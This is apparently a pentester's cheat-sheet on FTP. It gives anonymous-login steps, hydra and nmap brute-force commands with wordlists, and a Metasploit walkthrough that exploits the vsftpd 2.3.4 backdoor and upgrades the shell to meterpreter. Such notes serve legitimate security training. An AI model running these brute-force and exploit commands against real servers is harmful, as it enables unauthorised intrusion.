# Table of Contents
1. [Overview](#Overview)
	1. Ports
	3. Usage
	4. Related Services
2. [Tools](#Tools)
	1. [hydra](#hydra)
	2. [nmap](#nmap)
	3. [msfconsole](#msfconsole)

---

# #Overview 
FTP - File Transfer Protocol

File sharing protocol used by different services

## #Ports
- 21 : Win/Lin : Main port for access

## Usage
`ftp 192.156.2.3`
- anonymous login
	- user: anonymous
	- pass: null : just hit enter

## Related Services
vsftp
SFTP
ProFTPD

---

# #Tools
## #hydra
[Tool info - hydra](../Tools/Hydra.md)

Dictionary attack with *userlist* and *passlist*
- -t : threads
- -L : user File
- -P : pass File
```bash
hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.24.3 -t 4 ftp
```

---

## #nmap
[Tool info - nmap](../Tools/NMAP.md)

Scripts
```bash
nmap 192.168.24.3 --script ftp-brute --script-args userdb=/root/users -p 21
```
- --script
	- ftp-brute
		- `--sript-args userdb=/userlist.txt`

---

## msfconsole

1. `search type:exploit vsftpd`
2. `use exploit/unix/ftp/vsftpd_234_backdoor`
	1. info
	2. run : easy
	3. `/bin/bash -i` : launch bash session
	4. ctrl-z : to background the session
3. `search shell_to_meterpreter` : look for module to upgrade session
4. `use post/multi/manage/shell_to_meterpreter`
	1. `set LHOST eht1` : set to ip of interface eth1
	2. `set session 1` : set it to the session number for the shell connection
	3. `run`
5. `sessions -u 1` : to auto upgrade session to meterpreter
6. `sessions` : to show and then connect by specifying number
